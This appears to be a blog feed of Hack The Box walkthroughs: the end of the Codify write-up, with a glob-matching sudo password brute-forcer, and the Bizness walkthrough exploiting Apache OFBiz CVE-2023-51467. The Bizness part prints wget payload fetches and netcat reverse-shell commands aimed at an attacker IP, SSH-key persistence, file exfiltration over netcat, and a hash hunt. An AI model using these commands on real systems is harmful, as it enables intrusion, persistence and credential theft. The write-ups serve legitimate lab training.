highlighter-rouge">.sql.gz</code> file in the backup directory. Each backup file is named after the database.</li> </ul> </li> <li><strong>Post-backup Steps:</strong> <ul> <li>After backing up all the databases, the script prints a success message.</li> <li>It then changes the ownership of the backup directory to the <code class="language-plaintext highlighter-rouge">root</code> user and <code class="language-plaintext highlighter-rouge">sys-adm</code> group.</li> <li>The script modifies the permissions of the backup directory and its contents to <code class="language-plaintext highlighter-rouge">774</code> (read/write/execute for owner and group, read for others).</li> <li>Finally, it prints ‘Done!’ to indicate completion.</li> </ul> </li> </ol> <p>In summary, this script is a utility for backing up all MySQL databases on a server. It first confirms that the user running the script knows the MySQL root password, then proceeds to back up each database to a specified directory, securing the backups with appropriate permissions and ownership.</p> <blockquote> <p><em>After a fair bit of research, I came across <a href="https://blnknlights.github.io/htb/machines/easy/codify/codify.html">this great write up</a> that put me onto a track without just giving me the answer.</em></p> </blockquote> <h3 id="shellcheck">Shellcheck</h3> <p>Using a utility called <code class="language-plaintext highlighter-rouge">shellcheck</code>, the <code class="language-plaintext highlighter-rouge">mysql-backup.sh</code> can be assessed:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="o">[</span>★]<span class="nv">$ </span>shellcheck shell.sh

In shell.sh line 6:
<span class="nb">read</span> <span class="nt">-s</span> <span class="nt">-p</span> <span class="s2">"Enter MySQL password for </span><span class="nv">$DB_USER</span><span class="s2">: "</span> USER_PASS
^--^ SC2162: <span class="nb">read </span>without <span class="nt">-r</span> will mangle backslashes.


In shell.sh line 9:
<span class="k">if</span> <span class="o">[[</span> <span class="nv">$DB_PASS</span> <span class="o">==</span> <span class="nv">$USER_PASS</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
                  ^--------^ SC2053: Quote the right-hand side of <span class="o">==</span> <span class="k">in</span> <span class="o">[[</span> <span class="o">]]</span> to prevent glob matching.

For more information:
  https://www.shellcheck.net/wiki/SC2053 <span class="nt">--</span> Quote the right-hand side of <span class="o">==</span> i...
  https://www.shellcheck.net/wiki/SC2162 <span class="nt">--</span> <span class="nb">read </span>without <span class="nt">-r</span> will mangle backs...

</code></pre></div></div> <p>As shown, it gives the warning that:</p> <blockquote> <p>“<em>Quote the right-hand side of == in [[ ]] to prevent glob matching.</em>”</p> </blockquote> <h3 id="what-is-glob-matching">What is glob matching</h3> <p>Glob matching, in the context of shell scripts, refers to a feature where certain characters (like <code class="language-plaintext highlighter-rouge">*</code>, <code class="language-plaintext highlighter-rouge">?</code>, <code class="language-plaintext highlighter-rouge">[</code>, and <code class="language-plaintext highlighter-rouge">]</code>) are used as wildcards to match filenames or strings. This is commonly used in file operations but can also apply to string comparisons in conditional statements.</p> <p>In the script, <code class="language-plaintext highlighter-rouge">[[ $DB_PASS == $USER_PASS ]]</code> doesn’t quote <code class="language-plaintext highlighter-rouge">$USER_PASS</code>, which means the shell tries to perform glob matching instead of matching the literal string with the value of <code class="language-plaintext highlighter-rouge">$USER_PASS</code>. This means:</p> <ul> <li>If <code class="language-plaintext highlighter-rouge">$USER_PASS</code> contains a <code class="language-plaintext highlighter-rouge">*</code>, it could match any string of characters.</li> <li>If <code class="language-plaintext highlighter-rouge">$USER_PASS</code> contains a <code class="language-plaintext highlighter-rouge">?</code>, it could match any single character.</li> <li>If <code class="language-plaintext highlighter-rouge">$USER_PASS</code> contains <code class="language-plaintext highlighter-rouge">[</code> and <code class="language-plaintext highlighter-rouge">]</code>, it could match any characters inside the brackets.</li> </ul> <p>This behaviour can lead to unexpected results or security vulnerabilities. For instance, if <code class="language-plaintext highlighter-rouge">$USER_PASS</code> somehow contains <code class="language-plaintext highlighter-rouge">*</code>, the condition might unexpectedly evaluate to true.</p> <p>To prevent glob matching and ensure the script is comparing the actual string value of <code class="language-plaintext highlighter-rouge">$USER_PASS</code> with <code class="language-plaintext highlighter-rouge">$DB_PASS</code>, you should quote <code class="language-plaintext highlighter-rouge">$USER_PASS</code>:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="o">[[</span> <span class="nv">$DB_PASS</span> <span class="o">==</span> <span class="s2">"</span><span class="nv">$USER_PASS</span><span class="s2">"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
    ...
<span class="k">fi</span>

</code></pre></div></div> <p>This change ensures that the value of <code class="language-plaintext highlighter-rouge">$USER_PASS</code> is taken literally, without any glob matching.</p> <h3 id="brute-forcing-the-password">Brute-forcing the password</h3> <p>With the help of ChatGPT, the following script can brute force the password by glob matching the next character iteratively.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">string</span>
<span class="kn">import</span> <span class="n">subprocess</span>

<span class="k">def</span> <span class="nf">attempt_password</span><span class="p">(</span><span class="n">current_password</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="c1"># Execute the password check command
</span>        <span class="n">command</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">echo </span><span class="sh">'</span><span class="si">{</span><span class="n">current_password</span><span class="si">}</span><span class="s">*</span><span class="sh">'</span><span class="s"> | sudo /opt/scripts/mysql-backup.sh</span><span class="sh">"</span>
        <span class="n">output</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="nf">check_output</span><span class="p">(</span>
            <span class="n">command</span><span class="p">,</span>
            <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span>
            <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">STDOUT</span><span class="p">,</span>
            <span class="n">text</span><span class="o">=</span><span class="bp">True</span>
        <span class="p">)</span>
        <span class="k">return</span> <span class="sh">"</span><span class="s">Password confirmed!</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">output</span>
    <span class="k">except</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">CalledProcessError</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>

<span class="n">all_chars</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span>
<span class="n">password</span> <span class="o">=</span> <span class="sh">""</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">all_chars</span><span class="p">:</span>
        <span class="k">if</span> <span class="nf">attempt_password</span><span class="p">(</span><span class="n">password</span> <span class="o">+</span> <span class="n">char</span><span class="p">):</span>
            <span class="n">password</span> <span class="o">+=</span> <span class="n">char</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Current Password: </span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
            <span class="k">break</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="c1"># Exit the loop if no additional character matches
</span>        <span class="k">break</span>

<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Final Password: </span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="sh">"</span> <span class="k">if</span> <span class="n">password</span> <span class="k">else</span> <span class="sh">"</span><span class="s">Password not found.</span><span class="sh">"</span><span class="p">)</span>

</code></pre></div></div> <p>With the globbed password, and switching to the <strong>root</strong> user, the final flag is captured.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>joshua@codify:~<span class="nv">$ </span>su root
Password: 
root@codify:/home/joshua# <span class="nb">cd</span> ~
root@codify:~# <span class="nb">ls
</span>root.txt  scripts
root@codify:~# <span class="nb">cat </span>root.txt 
&lt;REDACTED&gt;
root@codify:~# 

</code></pre></div></div>]]></content><author><name></name></author><category term="HTB-Machines"/><category term="easy-box"/><category term="HTB"/><category term="arbitrary-code-execution"/><category term="ace"/><category term="remote-code-exeuction"/><category term="rce"/><category term="glob"/><category term="globbing"/><category term="secure-coding"/><category term="insecure-coding"/><category term="node.js"/><summary type="html"><![CDATA[Codify - Hack The Box walkthrough.]]></summary></entry><entry><title type="html">Bizness</title><link href="https://emdeh.github.io/blog/2024/bizness-walkthrough/" rel="alternate" type="text/html" title="Bizness"/><published>2024-01-23T14:14:00+00:00</published><updated>2024-01-23T14:14:00+00:00</updated><id>https://emdeh.github.io/blog/2024/bizness-walkthrough</id><content type="html" xml:base="https://emdeh.github.io/blog/2024/bizness-walkthrough/"><![CDATA[<h1 id="introduction">Introduction</h1> <p>Bizness is an easy box with a relatively convoluted privilege escalation that is not-so-easy. It involves enumerating a web application running an open-source enterprise resource planning (ERP) system called <strong>Apache OFBiz</strong>. The ERP has an <strong>authentication bypass</strong> vulnerability that allows for a subsequent an <strong>Server Side Request Forgery (SSRF)</strong> vulnerability to be exploited to obtain a reverse shell.</p> <p>From there the system is enumerated manually and with the help of Linpeas to locate a custom-salted hash. Once the hash is cracked, it is just a matter of switching to the root user to obtain the final flag.</p> <h2 id="methods">Methods</h2> <h3 id="authentication-bypass">Authentication bypass</h3> <p>An authentication bypass vulnerability is a security flaw that allows an attacker to access a system, application, or network without going through the standard authentication process. This type of vulnerability effectively undermines the security mechanisms that verify the identity of a user or entity, granting unauthorized access.</p> <p>Key aspects of an authentication bypass vulnerability include:</p> <ol> <li> <p><strong>Bypassing Security Checks:</strong> The attacker finds a way to circumvent or exploit weaknesses in the authentication process, such as exploiting code flaws, misconfigurations, or logic errors.</p> </li> <li> <p><strong>Unauthorised Access:</strong> As a result, the attacker gains access to restricted areas of the system or application, often with the same privileges as a legitimate user.</p> </li> <li> <p><strong>Potential Impact:</strong> This can lead to various security issues, such as data breaches, privilege escalation, and system compromise.</p> </li> <li> <p><strong>Common Causes:</strong> Causes might include inadequate input validation, insecure direct object references, or flawed session management.</p> </li> </ol> <h3 id="server-side-request-forgery-ssrf">Server Side Request Forgery (SSRF)</h3> <p>Server-Side Request Forgery (SSRF) is a type of web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker’s choosing. This vulnerability occurs when a web application fetches a remote resource without validating the user-supplied URL, allowing an attacker to manipulate the requests made by the server.</p> <p>In an SSRF attack, the attacker can:</p> <ol> <li> <p><strong>Access Services Inaccessible to the Public:</strong> The attacker can target internal systems behind firewalls that are normally inaccessible from the external network, including services running on the server itself (like databases or internal web applications).</p> </li> <li> <p><strong>Manipulate Requests:</strong> The attacker might manipulate the server to send requests to unintended locations, possibly leading to information disclosure, privilege escalation, or other malicious activities.</p> </li> <li> <p><strong>Conduct Port Scanning:</strong> SSRF can be used to scan ports and find services running on servers within the organization’s internal network.</p> </li> <li> <p><strong>Exploit Vulnerable Services and APIs:</strong> If the internal systems have vulnerabilities, SSRF can provide a pathway for exploiting these vulnerabilities.</p> </li> </ol> <p>Mitigating SSRF typically involves validating and sanitizing all user input, especially URLs, implementing strict access controls, and using allowlists for external services that the application can interact with.</p> <p>SSRF is a significant security concern in modern web applications, especially those that interact with complex systems and external services.</p> <h2 id="tools">Tools</h2> <ul> <li><strong>Nmap</strong> for initial network enumeration.</li> <li><strong><a href="https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass">CVE-2023-51467 POC</a>)</strong> for vulnerability scanning and initial access.</li> <li><strong><a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">Linpeas</a></strong> for system enumeration.</li> <li><strong><a href="https://medium.com/@mastercode112/htb-bizness-easy-writeup-bacce3ba0969">Custom python script</a></strong> to convert custom SHA hash.</li> </ul> <h2 id="tactics">Tactics</h2> <ul> <li><strong>Establishing persistence</strong> via rogue SSH keys.</li> </ul> <hr/> <h1 id="enumeration">Enumeration</h1> <p>As always, enumeration begins with an Nmap scan.</p> <h2 id="nmap-scanning">Nmap scanning</h2> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> 10.129.8.141 | <span class="nb">tee </span>nmap-output.txt    
</code></pre></div></div> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report <span class="k">for </span>10.129.8.141
Host is up <span class="o">(</span>0.31s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 997 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 <span class="o">(</span>RSA<span class="o">)</span>
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp  open  http     nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
443/tcp open  ssl/http nginx 1.18.0
|_http-server-header: nginx/1.18.0
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
|_http-title: Did not follow redirect to https://bizness.htb/
| ssl-cert: Subject: <span class="nv">organizationName</span><span class="o">=</span>Internet Widgits Pty Ltd/stateOrProvinceName<span class="o">=</span>Some-State/countryName<span class="o">=</span>UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
| tls-nextprotoneg: 
|_  http/1.1
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>66.11 seconds
                                                                
</code></pre></div></div> <h3 id="findings">Findings</h3> <ol> <li>Three ports open: <ul> <li>22</li> <li>80</li> <li>443</li> </ul> </li> <li>Domain name http://bizness.htb</li> </ol> <h2 id="domain-enumeration">Domain enumeration</h2> <p>The domain <code class="language-plaintext highlighter-rouge">bizness.htb</code> can be added to the local hosts file:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"10.129.8.141 bizness.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
</code></pre></div></div> <p>This makes it reachable and reveals a simple landing page:</p> <p><img src="/assets/img/20240123-bizness/20240123-page.png" alt="20240123-page.png" class="auto-resize"/></p> <p>At the bottom of the page, it states the site is powered by <strong>Apache OFBiz</strong>.</p> <p><img src="/assets/img/20240123-bizness/20240123-pagepower.png" alt="20240123-pagepower.png" class="auto-resize"/></p> <h3 id="what-is-apache-ofbiz">What is Apache OFBiz</h3> <p>Apache OFBiz (Open For Business) is an open-source enterprise resource planning (ERP) system. It provides a suite of enterprise applications that integrate and automate many of the business processes of an enterprise. OFBiz includes modules for inventory management, order management, customer relationship management (CRM), e-commerce, accounting, and supply chain management, among others.</p> <p>A Google search for <em>Apache OFBiz vulnerabilities</em> returns a critical zero-day (CVE-2023-51467).</p> <h3 id="what-is-cve-2023-51467">What is CVE-2023-51467</h3> <p>CVE-2023-51467 is a critical vulnerability in Apache OFBiz, involving an authentication bypass with a CVSS score of 9.8. The vulnerability, particularly affecting the <code class="language-plaintext highlighter-rouge">/webtools/control/ping</code> HTTP endpoint, allows unauthorised access without authentication.</p> <p>While initially demonstrating the vulnerability’s existence, further analysis revealed its potential for arbitrary code execution, including executing payloads directly from memory. This flaw enables attackers not only to bypass authentication but also to potentially exploit Server-Side Request Forgery (SSRF) vulnerabilities.</p> <hr/> <h2 id="apache-ofbiz-enumeration">Apache OFBiz enumeration</h2> <p>Without knowing the version of Apache OFBiz, it is unclear whether the target is vulnerable to the zero-day. However, a search of GitHub revealed numerous PoCs to scan a target to confirm or deny if the ERP is vulnerable.</p> <p>One such scanner is <a href="https://github.com/Chocapikk/CVE-2023-51467"> Chocapikk/CVE-2023-51467: Apache OfBiz Auth Bypass Scanner for CVE-2023-51467</a>, which was used to confirm the target is, in fact, vulnerable.</p> <p>First the scanner is cloned from the repository and the dependencies installed.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>git clone https://github.com/Chocapikk/CVE-2023-51467.git

pip <span class="nb">install</span> <span class="nt">-r</span> requirements.txt 
</code></pre></div></div> <p>Then the scanner can be executed by passing the domain and an output location. The output location is useful if a list of domains were being scanned. As the output shows, the <code class="language-plaintext highlighter-rouge">bizness.htb</code> is indeed vulnerable.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python exploit.py <span class="nt">-u</span> bizness.htb <span class="nt">-o</span> ~/Documents/htb-machines/bizness/scans/output.txt
<span class="o">[</span>00:00:49] Vulnerable URL found: bizness.htb, Response: PONG                                                                                                                  exploit.py:53
|████████████████████████████████████████| 1/1 <span class="o">[</span>100%] <span class="k">in </span>3.3s <span class="o">(</span>0.30/s<span class="o">)</span> 

</code></pre></div></div> <hr/> <h1 id="exploitation">Exploitation</h1> <p>Another exploit scanner which includes an exploit POC as well was found.</p> <p>Using <a href="https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass">jakabakos/Apache-OFBiz-Authentication-Bypass</a> the target was reconfirmed to be vulnerable.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>python3 exploit.py <span class="nt">--url</span> http://bizness.htb                                                                                                          │
<span class="o">[</span>+] Scanning started...                                                                                                                                  │
<span class="o">[</span>+] Apache OFBiz instance seems to be vulnerable.  
</code></pre></div></div> <p>This particular POC included the exploit itself, which will provide <strong>remote code execution</strong> on the target. Theoretically this can be leveraged to induce the server to request a payload from a malicious server. In this instance, it can be used to move <code class="language-plaintext highlighter-rouge">netcat</code> onto the target to establish a reverse-shell.</p> <p>To do this <code class="language-plaintext highlighter-rouge">nc</code> can be copied to a working directory:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cp</span> /usr/bin/nc ./
</code></pre></div></div> <p>Then a simple python webserver can be started to serve the binary:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 80
</code></pre></div></div> <p>Once <code class="language-plaintext highlighter-rouge">netcat</code> is ready to be served, the exploit can be used to remotely execute a command on the target to fetch binary:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 exploit.py <span class="nt">--url</span> http://bizness.htb <span class="nt">--cmd</span> <span class="s2">"wget http://10.10.14.5/nc"</span>  

<span class="o">[</span>+] Generating payload...                                                               
Picked up _JAVA_OPTIONS: <span class="nt">-Dawt</span>.useSystemAAFontSettings<span class="o">=</span>on <span class="nt">-Dswing</span>.aatext<span class="o">=</span><span class="nb">true</span>           
<span class="o">[</span>+] Payload generated successfully.                                                     
<span class="o">[</span>+] Sending malicious serialized payload...                                             
<span class="o">[</span>+] The request has been successfully sent. Check the result of the command.   
</code></pre></div></div> <p>Now that <code class="language-plaintext highlighter-rouge">netcat</code> is on the target, a listener can be established on a local machine to receive a reverse-shell.<sup><a href="#note1" id="ref1">1</a></sup></p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rlwrap <span class="nt">-cAr</span> nc <span class="nt">-lvnp</span> 4321
</code></pre></div></div> <p>Once a listener is active, a subsequent command can be sent to the target which will execute <code class="language-plaintext highlighter-rouge">netcat</code> on the target to establish the reverse shell.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 exploit.py <span class="nt">--url</span> https://bizness.htb <span class="nt">--cmd</span> <span class="s2">"nc 10.10.14.5 4321 -c /bin/bash"</span>
</code></pre></div></div> <p>The reverse shell is then caught by the listener.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>rlwrap <span class="nt">-cAr</span> nc <span class="nt">-lvnp</span> 4321  
listening on <span class="o">[</span>any] 4321 ...
connect to <span class="o">[</span>10.10.14.5] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.8.141] 38270
<span class="nb">whoami
</span>ofbiz
</code></pre></div></div> <p>Once the reverse-shell is established, it can be upgraded with a simple python script to improve the interactivity.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="sh">"</span><span class="s">import pty;pty.spawn(</span><span class="sh">'</span><span class="s">/bin/bash</span><span class="sh">'</span><span class="s">)</span><span class="sh">"</span>
</code></pre></div></div> <p>A quick look around and the first flag is found.</p> <p><img src="/assets/img/20240123-bizness/20240123-userflag.png" alt="20240123-userflag.png" class="auto-resize"/></p> <hr/> <h1 id="establishing-persistence">Establishing persistence</h1> <p>It can be helpful to establish persistence on a target to ensure it can be easily accessed without having to exploit it again through the initial vulnerability. This can help evade detection and ensure access in the event the initial attack vector is mitigated.</p> <p>One way to do this is to place an <strong>authorized ssh key</strong> on the target.</p> <p>To do this, the <code class="language-plaintext highlighter-rouge">.ssh</code> folder is required in the <code class="language-plaintext highlighter-rouge">/home/ofbiz</code> directory.</p> <p>Within this folder an <code class="language-plaintext highlighter-rouge">authorized_keys</code> file is needed.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir</span> .ssh

<span class="nb">cd</span> .ssh

<span class="nb">touch </span>authorized_keys
</code></pre></div></div> <p>On the machine from which the target will be accessed, <strong>ssh keys</strong> are required.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh-keygen

Generating public/private rsa key pair.
Enter file <span class="k">in </span>which to save the key <span class="o">(</span>/home/ofbiz/.ssh/id_rsa<span class="o">)</span>: 

Enter passphrase <span class="o">(</span>empty <span class="k">for </span>no passphrase<span class="o">)</span>: 

Enter same passphrase again: 

Your identification has been saved <span class="k">in</span> /home/ofbiz/.ssh/id_rsa
Your public key has been saved <span class="k">in</span> /home/ofbiz/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:&lt;REDACTED&gt;+
</code></pre></div></div> <p>Then the public key needs to be copied over and placed in the <code class="language-plaintext highlighter-rouge">/home/ofbiz/.ssh/authorized_keys</code> file. This can be achieved with:</p> <p><code class="language-plaintext highlighter-rouge">echo "contents-of-public-key" &gt; /home/ofbiz/.ssh/authorized_keys</code></p> <p>Then the private key needs <code class="language-plaintext highlighter-rouge">chmod 600 id_rsa</code> permission, which will enable ssh login with:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-i</span> /path/to/private0-key ofbiz@IP
</code></pre></div></div> <p>As long as the key remains in the authorized_keys file, this method can be used to return to the target as required.</p> <hr/> <h1 id="system-enumeration">System enumeration</h1> <p>Enumerating the system for a vector to achieve privilege escalation was rather challenging for an easy box.</p> <h2 id="linepeas">Linepeas</h2> <p>A good starting point is to move <code class="language-plaintext highlighter-rouge">linpeas</code> onto the system and execute it. The binary can be moved over using the <code class="language-plaintext highlighter-rouge">python -m http.server</code>.</p> <p>Once there it can be ran with:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash linpeas.sh | <span class="nb">tee </span>output.txt
</code></pre></div></div> <p>This will send the output to both the console and a txt file for later review.</p> <p>The output can be sent back to a local machine using <code class="language-plaintext highlighter-rouge">netcat</code> again.</p> <p>Firstly start another <code class="language-plaintext highlighter-rouge">netcat</code> listener on the receiving machine:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-l</span> <span class="nt">-p</span> 4321 <span class="o">&gt;</span> ~/path/to/a/receiving/file.txt
</code></pre></div></div> <p>Then, on the target, send the file using:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc 10.10.14.5 4321 &lt; output.txt
</code></pre></div></div> <p>This series of commands essentially streams the contents of the output.txt on the target machine, back to the output.txt file on the receiving machine.</p> <h2 id="file-searching">File searching</h2> <p>Reviewing the Linpeas output eventually leads to a writeable directory <code class="language-plaintext highlighter-rouge">/opt/ofbiz/runtime/data/derby</code></p> <p>After much reading, it was found in an <a href="https://cwiki.apache.org/confluence/display/OFBIZ/Apache+OFBiz+Technical+Production+Setup+Guide">Apache wiki</a> that OFBiz uses an embedded Java database called <strong>Derby</strong>.</p> <p><img src="/assets/img/20240123-bizness/20240123-wikiresearch.png" alt="20240123-wikiresearch.png" class="auto-resize"/></p> <p>After reviewing the file system structure, an interesting README is located: inside the database directory.</p> <p><img src="/assets/img/20240123-bizness/20240123-readme-warning.png" alt="20240123-readme-warning.png" class="auto-resize"/></p> <p>The <code class="language-plaintext highlighter-rouge">seg0</code> database contains a number of .dat files.</p> <blockquote> <p><em>ChatGPT was kind enough to explain that .dat files in the context of Apache OFBiz are used for data loading purposes. Given the README notice, it’s possible that these files might contain credentials.</em></p> </blockquote> <p>The command <code class="language-plaintext highlighter-rouge">find seg0 -type f -exec cat {} \; &gt; dir.txt</code> can be used to create a file that contains the combined contents of all the files found in the <code class="language-plaintext highlighter-rouge">seg0</code> directory and its subdirectories.<sup><a href="#note2" id="ref2">2</a></sup></p> <p>This can be useful for consolidating data or logs spread across multiple files into a single document for easier analysis or review.</p> <p>The command <code class="language-plaintext highlighter-rouge">strings dir.txt | grep SHA</code> can then be used to extract printable strings from the consolidated file and search for any occurrence of text. After many attempts, the string “SHA” was tried.</p> <p>This revealed a hash.</p> <p><img src="/assets/img/20240123-bizness/20240123-hash.png" alt="20240123-hash.png" class="auto-resize"/></p> <p>The hash has a salt and would need to be converted to hexadecimal to be cracked by Hashcat.</p> <p>Despite trying to do this with the help of ChatGPT, I was unable to obtain a hash that was suitable for Hashcat.</p> <p>In the end, I found a python script that was able to do this, thanks to this <a href="https://medium.com/@mastercode112/htb-bizness-easy-writeup-bacce3ba0969">write up</a>.</p> <p>The script is:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">hashlib</span>  
<span class="kn">import</span> <span class="n">base64</span>  
<span class="kn">import</span> <span class="n">os</span>  
<span class="k">def</span> <span class="nf">cryptBytes</span><span class="p">(</span><span class="n">hash_type</span><span class="p">,</span> <span class="n">salt</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>  
<span class="k">if</span> <span class="ow">not</span> <span class="n">hash_type</span><span class="p">:</span>  
<span class="n">hash_type</span> <span class="o">=</span> <span class="sh">"</span><span class="s">SHA</span><span class="sh">"</span>  
<span class="k">if</span> <span class="ow">not</span> <span class="n">salt</span><span class="p">:</span>  
<span class="n">salt</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">urlsafe_b64encode</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="nf">urandom</span><span class="p">(</span><span class="mi">16</span><span class="p">)).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">)</span>  
<span class="n">hash_obj</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">hash_type</span><span class="p">)</span>  
<span class="n">hash_obj</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">salt</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">))</span>  
<span class="n">hash_obj</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>  
<span class="n">hashed_bytes</span> <span class="o">=</span> <span class="n">hash_obj</span><span class="p">.</span><span class="nf">digest</span><span class="p">()</span>  
<span class="n">result</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">$</span><span class="si">{</span><span class="n">hash_type</span><span class="si">}</span><span class="s">$</span><span class="si">{</span><span class="n">salt</span><span class="si">}</span><span class="s">$</span><span class="si">{</span><span class="n">base64</span><span class="p">.</span><span class="nf">urlsafe_b64encode</span><span class="p">(</span><span class="n">hashed_bytes</span><span class="p">).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s">+</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">.</span><span class="sh">'</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span>  
<span class="k">return</span> <span class="n">result</span>  
<span class="k">def</span> <span class="nf">getCryptedBytes</span><span class="p">(</span><span class="n">hash_type</span><span class="p">,</span> <span class="n">salt</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>  
<span class="k">try</span><span class="p">:</span>  
<span class="n">hash_obj</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">hash_type</span><span class="p">)</span>  
<span class="n">hash_obj</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">salt</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">))</span>  
<span class="n">hash_obj</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>  
<span class="n">hashed_bytes</span> <span class="o">=</span> <span class="n">hash_obj</span><span class="p">.</span><span class="nf">digest</span><span class="p">()</span>  
